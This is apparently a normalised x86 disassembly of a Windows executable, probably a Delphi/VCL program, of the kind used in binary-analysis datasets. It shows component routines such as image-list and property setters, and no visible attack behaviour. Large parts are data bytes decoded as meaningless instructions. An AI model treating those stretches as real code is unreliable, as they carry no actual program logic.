add [ edi + edx * 4 - 0x5f17ffbf ] ch
inc ecx
add al bh
mov al [ 0xffffffff98100041 ]
inc ecx
add [ eax + ebx * 4 + 0x41 ] ah
add [ eax ] dl
cdq
inc ecx
add [ eax + 0x419a ] ch
fwait
inc ecx
add [ ebx + ebx * 4 - 0x61c7ffbf ] dl
inc ecx
add [ esi + ebx * 4 + 0x41 ] dl
add [ ecx + 0x41 ] cl
add [ edi + ebx * 4 - 0x5ca3ffbf ] bl
inc ecx
add [ ebx + 0x41 ] ch
add [ 0x6f685354 ] cl
jb r-xdata
and al 0x95
inc ecx
add ah al
mov eax [ 0xffffffffa2200041 ]
inc ecx
add ah dh
mov [ 0xffffffff9be40041 ] al
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ebp + ebx * 4 + 0x41 ] ch
dec esp
imul esi [ ebx + 0x74 ] 0xb7b00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x48 ] cl
inc esp
add [ eax ] dh
add [ eax ] al
add [ esi + ebx * 2 + 0x33b40041 ] ah
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
add [ eax ] al
add al [ eax ]
out dx al
add [ eax + esi * 8 - 0x4537ffbf ] al
inc esp
add [ esi + eax * 8 ] ah
inc esp
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + eax * 8 - 0xebbffbc ] dh
inc ecx
add al ch
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xchg esp eax
pop edi
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb8cc0000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
mov ecx 0xb9640044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x47 ] al
inc esp
add [ eax - 0x47 ] dl
inc esp
add [ eax + 0x64000000 ] ah
mov ch 0x44
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
sub_44b946
out dx eax
push [ eax - 0x3a ]
inc esp
add [ eax + 0xd0044c6 ] bl
push esp
inc ebx
jne r-xdata
add al 0x31
je r-xdata
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
inc eax
add [ eax ] ah
xor [ eax ] eax
xor al 0xef
inc ecx
add [ eax ] dh
out dx eax
inc ecx
add [ eax - 0x11 ] ch
inc ecx
inc eax
add [ ecx + esi ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
mov ecx 0xd070044
push esp
inc ebx
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41f024
test bl bl
jle r-xdata
mov edx esi
call sub_44be6c
out dx eax
inc ecx
add [ edi + ebp * 8 - 0x1033ffbf ] bl
inc ecx
add ah ch
out dx al
inc ecx
add [ eax - 0x2bffbe11 ] al
out dx eax
inc ecx
add [ edi + edi * 4 - 0x402fffbc ] bh
inc esp
add ah ah
mov edi 0xbff80044
inc esp
add [ eax + eax * 8 ] cl
inc esp
add [ eax ] ah
rol [ eax + eax + 0x34 ] 0xc0
inc esp
add [ eax - 0x40 ] cl
inc esp
add [ eax + eax * 8 + 0x44 ] bl
add [ eax - 0x40 ] dh
inc esp
add [ eax + eax * 8 - 0x3f77ffbc ] al
inc esp
add [ eax + eax * 8 - 0x3f6fffbc ] cl
inc esp
add [ eax + eax * 8 - 0x3f67ffbc ] dl
inc esp
add [ eax + eax * 8 - 0x3f5fffbc ] bl
inc esp
add [ eax + eax * 8 - 0x3f57ffbc ] ah
inc esp
add [ eax + eax * 8 - 0x3f4fffbc ] ch
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x99e85653
jpe r-xdata
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
add al cl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
int3
sub_44ba58
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41f024
test bl bl
jle r-xdata
mov edx esi
call sub_44be6c
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_44bac8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41eb38
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44bb70
sub_44bafc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ba8c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_417d84
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_417f10
sub_44bb44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_40434c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403f94
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44bb70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44be6c
mov edx ebx
mov eax esi
call sub_44be4c
sub_44bb98
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44bb70
sub_44bbc4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_461698
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403368
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41f0b0
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43ca98
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44bc1c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4616c0
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403368
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41f0cc
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43ca98
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44bc74
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e6d8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44bdf8
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44bce0
push ebx
push esi
push edi
call sub_4034f8
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_40316c
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_417f7c
call sub_40316c
mov eax [ edi + 0x30 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41e724
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034e0
sub_44bd30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44bd78
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_417ef0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov edx edi
call sub_44bafc
sub_44bdc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44da80
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44dac4
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41e7a8
sub_44be04
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41e9f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44be6c
sub_44be4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_417d38
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41e7a8
pop esi
pop ebx
retn
sub_44be6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418030
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44be88
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44bef0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_457478
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44f31c
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44c6f8
mov edx ebp
call sub_44c758
inc eax
je r-xdata
sub_44bf7c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44bf9c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44c0b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41efe0
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44c108
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_40316c
mov eax [ esi + 0x9c ]
call sub_40316c
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ba58
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d3ac
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_44c158
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41858c
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44c204
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44c264
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44c36c
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44c4a4
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44c504
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44c560
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44c5c4
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44c204
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_40434c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403f94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40331c
test eax eax
je r-xdata
sub_44c264
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44c35c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44bdbc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_40331c
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44bda8
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44c264
sub_44c36c
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40331c
test eax eax
je r-xdata
sub_44c3e4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_40434c
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403f94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_417e94
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_417e94
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
sub_44c44c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40331c
test eax eax
je r-xdata
sub_44c4a4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_40434c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403f94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40331c
test eax eax
je r-xdata
sub_44c504
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40331c
test eax eax
je r-xdata
sub_44c560
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40331c
test eax eax
je r-xdata
sub_44c5c4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_417e94
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_40331c
test eax eax
je r-xdata
sub_44c624
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_40434c
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41ec30
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44c204
sub_44c670
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44c698
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44bbc4
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44c264
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44c72c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419dc8
mov edi eax
mov eax esi
call sub_44f608
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44c758
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44c79c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44c7c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c7c8
retn
sub_44c7fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
enter 0x44 0x4c
enter 0x44 0x10
add [ eax ] al
add [ eax - 0x4bffbff0 ] dh
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] dl
jecxz r-xdata
arpl [ ebp + 0x64 ] si
add [ ecx ] al
add bh bh
inc [ ebx + 0x44 ]
add [ ebx ] cl
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
insd
popad
push es
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
outsb
push ebx
je r-xdata
jae r-xdata
add [ eax ] al
pushad
inc ecx
add [ eax - 0x12 ] cl
inc ecx
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 - 0x366bffbc ] cl
inc esp
add [ eax ] ch
popad
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
dec eax
leave
inc esp
popad
dec ecx
outsb
js r-xdata
inc esp
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x38 ] bl
inc esp
add [ edi ] al
jae r-xdata
add [ eax ] al
and bl al
mov eax eax
push ebx
push esi
test dl dl
je r-xdata
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0xac00408d
leave
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 + 0x44 ] ch
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + ecx * 8 + 0x69070044 ] ch
